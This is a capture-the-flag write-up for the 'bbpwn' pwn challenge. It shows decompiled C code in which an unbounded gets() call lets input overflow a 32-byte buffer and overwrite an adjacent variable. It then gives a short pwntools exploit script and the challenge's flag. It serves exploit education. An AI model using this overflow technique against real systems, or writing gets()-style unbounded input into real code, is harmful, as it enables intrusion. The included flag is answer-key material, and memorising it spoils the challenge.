# bbpwn

- Category: pwn
- Rating: 50 pts

This is, as the name suggests, a very easy pwn challenge. Toss it into ghidra and you will see the main function.

```c
undefined4 main(void)

{
  undefined4 uVar1;
  int in_GS_OFFSET;
  char local_38 [32];
  int local_18;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  local_18 = 0;
  printf("Enter a string: ");
  fflush(stdout);
  gets(local_38);
  if (local_18 == 0x1337beef) {
    read_flag();
  }
  else {
    printf("\nThe string \"%s\" is lame.\n",local_38);
    fflush(stdout);
  }
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = __stack_chk_fail_local();
  }
  return uVar1;
}
```

`gets`, as per its job, is going to helpfully copy our input into the 32 char long `local_38` buffer without bounds checking which lets us overflow into and control the value of `local_18` which is right next to it on the stack. So...


# Solution

```python
#!/usr/bin/env python

from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']

r = remote('challenges.tamuctf.com', 4252)
# r = process('./bbpwn'); gdb.attach(r); pause()

r.sendlineafter('Enter a string: ', b'A'*32 + p32(0x1337beef))
print(r.recv)

r.interactive()
```
![execution](execution.png)

# Flag

`gigem{0per4tion_skuld_74757474757275}`
